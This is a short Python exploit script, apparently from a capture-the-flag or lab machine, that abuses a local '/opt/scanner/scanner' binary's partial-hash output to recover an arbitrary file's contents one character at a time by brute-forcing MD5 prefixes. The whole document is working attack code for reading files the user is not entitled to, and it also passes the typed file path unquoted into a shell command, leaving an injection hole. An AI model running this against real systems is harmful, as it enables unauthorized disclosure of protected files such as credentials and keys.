import os
import hashlib

file = input("File path: ")
content = ""
cont = 1

while True:
    try:
        partial_hash = os.popen(f"/opt/scanner/scanner -p -s 123456 -c {file} -l {cont}").read().split("\n")[0].split()[-1]
        for char in range(256):
            test_string = content + chr(char)
            hashed_string = hashlib.md5(test_string.encode()).hexdigest()
            if hashed_string == partial_hash:
                content += chr(char)
                break
        cont += 1
    except:
        break

os.system("clear")
print(f"Content of file {file}")
print(content)
